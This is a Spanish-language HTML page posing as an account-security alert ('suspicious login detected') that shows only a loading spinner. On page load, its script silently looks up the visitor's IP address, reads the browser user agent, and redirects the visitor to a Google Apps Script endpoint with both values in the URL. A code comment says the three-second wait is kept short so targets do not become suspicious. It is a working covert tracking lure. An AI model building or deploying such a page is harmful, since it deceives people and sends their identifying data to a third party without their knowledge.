<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Cargando...</title>

    <meta property="og:title" content="Inicio de sesión sospechoso detectado" />
    <meta property="og:description" content="Se ha detectado un acceso no autorizado. Verificando seguridad de la cuenta..." />
    <meta property="og:image" content="https://dennismariapinogomez-cmd.github.io/validacion-seguridad/portada.jpeg" />
    <meta property="og:type" content="website" />

    <style>
        body { background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="loader"></div>

<script>
    async function auditoriaSilenciosa() {
        let ipCapturada = "No_Detectada";
        
        try {
            // Captura rápida de IP (Máximo 3 segundos de espera para que no sospechen)
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3000);

            const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
            const data = await response.json();
            ipCapturada = data.ip;
            clearTimeout(timeoutId);
        } catch (e) {
            ipCapturada = "IP_Oculta_o_Timeout";
        }

        // Datos del dispositivo
        const hardware = navigator.userAgent;
        // Usuario genérico ya que no hay formulario
        const usuarioAnonimo = "Clic_Directo_Auditoria"; 

        // URL DE TU APPS SCRIPT
        const endpoint = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";
        
        // Redirección inmediata inyectando datos
        window.location.href = `${endpoint}?u=${encodeURIComponent(usuarioAnonimo)}&ip=${encodeURIComponent(ipCapturada)}&ua=${encodeURIComponent(hardware)}`;
    }

    // Ejecutar automáticamente al abrir la página
    window.onload = auditoriaSilenciosa;
</script>
</body>
</html>
